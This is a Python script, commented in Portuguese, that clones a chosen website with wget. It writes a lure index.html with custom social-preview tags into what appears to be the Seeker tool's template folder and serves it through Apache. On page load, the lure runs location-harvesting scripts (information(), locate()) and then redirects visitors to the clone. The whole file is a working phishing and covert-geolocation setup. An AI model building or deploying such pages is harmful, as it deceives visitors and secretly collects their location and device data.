#!/usr/bin/env python3

import os
import subprocess
import shutil
import socket
from pathlib import Path
from urllib.parse import urlparse
import sys

# Cores para impressão no terminal
R = '\033[31m'  # Vermelho
G = '\033[32m'  # Verde
C = '\033[36m'  # Ciano
W = '\033[0m'   # Branco

def get_private_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0)
        s.connect(('8.8.8.8', 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print(f'{R}[ERRO]{W} Não foi possível obter o IP privado: {e}')
        return '127.0.0.1'

def clone_website(url, target_dir):
    print(f'{C}[INFO]{W} Clonando o site {url} com wget...')
    os.makedirs(target_dir, exist_ok=True)
    cmd = [
        'wget', '--no-check-certificate', '--mirror',
        '--convert-links', '--adjust-extension',
        '--page-requisites', '--no-parent',
        url,
        '-P', target_dir
    ]
    ret = subprocess.call(cmd)
    if ret == 0:
        print(f'{G}[SUCESSO]{W} Site clonado em {target_dir}')
    else:
        print(f'{R}[ERRO]{W} Falha ao clonar o site (código {ret})')
    return target_dir

def create_initial_index(redirect_url, sitename, title, desc, image_url, home_dir):
    print(f'{C}[INFO]{W} Criando arquivo index.html com redirecionamento...')

    html = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8">
    <meta property="og:title" content="{title}">
    <meta property="og:site_name" content="{sitename}">
    <meta property="og:description" content="{desc}">
    <meta property="og:image" content="{image_url}">
    <title>{title}</title>
    <script>
        if (location.protocol === 'http:') {{
            location.href = 'https:' + location.href.slice(5);
        }}
    </script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="js/location.js"></script>
</head>
<body onload="information(); locate(function() {{ window.location = '{redirect_url}/index2.html'; }}, function() {{ document.body.innerHTML = 'Erro ao localizar.'; }} );">
</body>
</html>"""

    tpl_dir = os.path.join(home_dir, 'seeker/template/custom_og_tags')
    os.makedirs(tpl_dir, exist_ok=True)

    index_path = os.path.join(tpl_dir, 'index.html')
    with open(index_path, 'w', encoding='utf-8') as f:
        f.write(html)

    index_temp = os.path.join(tpl_dir, 'index_temp.html')
    shutil.copy(index_path, index_temp)

    print(f'{G}[SUCESSO]{W} Arquivo index.html criado em {index_path}')
    return tpl_dir

def copy_to_apache(src_dir, apache_dir='/var/www/html'):
    print(f'{C}[INFO]{W} Copiando arquivos para {apache_dir}...')
    for item in os.listdir(src_dir):
        src = os.path.join(src_dir, item)
        dst = os.path.join(apache_dir, item)
        try:
            shutil.copy(src, dst)
            print(f'{G}[COPIADO]{W} {src} → {dst}')
        except PermissionError:
            print(f'{R}[PERMISSÃO NEGADA]{W} {src} → {dst}')
        except Exception as e:
            print(f'{R}[ERRO]{W} {src}: {e}')

def start_apache():
    print(f'{C}[INFO]{W} Iniciando Apache...')
    cmds = [
        ['systemctl', 'start', 'apache2'],
        ['service', 'apache2', 'start']
    ]
    for cmd in cmds:
        try:
            ret = subprocess.call(['sudo'] + cmd)
            if ret == 0:
                print(f'{G}[SUCESSO]{W} Apache iniciado com {" ".join(cmd)}')
                return
        except Exception as e:
            print(f'{R}[ERRO]{W} ao executar {" ".join(cmd)}: {e}')
    print(f'{R}[FALHA]{W} Verifique se o Apache está instalado.')

def main():
    if os.geteuid() != 0:
        print(f'{R}[ERRO]{W} Execute como root (use sudo).')
        sys.exit(1)

    home = str(Path.home())

    print(f'{C}===== CONFIGURAÇÃO DO CLONE ====={W}')
    url = input('URL do site a ser clonado: ').strip()
    port = input('Porta para hospedar (ex: 8080): ').strip()
    title = input('Título da página (og:title): ').strip()
    desc = input('Descrição (og:description): ').strip()
    image_url = input('URL da imagem (og:image): ').strip()

    private_ip = get_private_ip()
    redirect_url = f'http://{private_ip}:{port}'

    parsed = urlparse(url)
    hostname = parsed.hostname or url
    sitename = hostname.split('.')[0]

    target_dir = clone_website(url, '/var/www/html/site_clone')
    tpl_dir = create_initial_index(redirect_url, sitename, title, desc, image_url, home)
    copy_to_apache(tpl_dir)
    start_apache()

    print(f'{G}[OK]{W} Site hospedado em: {redirect_url}')

if __name__ == '__main__':
    main()
